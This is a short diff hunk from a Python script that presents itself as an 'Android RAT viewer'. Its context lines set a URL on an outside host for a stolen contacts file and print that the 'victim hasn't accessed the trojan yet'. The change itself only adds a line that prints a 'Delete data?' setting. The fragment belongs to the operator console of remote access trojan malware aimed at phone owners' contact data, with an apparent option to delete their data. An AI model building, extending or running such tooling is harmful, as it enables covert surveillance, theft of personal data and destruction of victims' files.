@@ -12,6 +12,7 @@ contacts_url = "http://bluntcord.medianewsonline.com/aroid_to/contacts.txt"
 print(f"{BLUE}Coded by Nihility{RESET}")
 print(f"{RED}Android RAT viewer.{RESET}")
 print(f"{RED}Victim hasn't accessed the trojan yet...{RESET}")
+print("Delete data?: " + delete_data)
 time.sleep(1)
 while True:
     try:
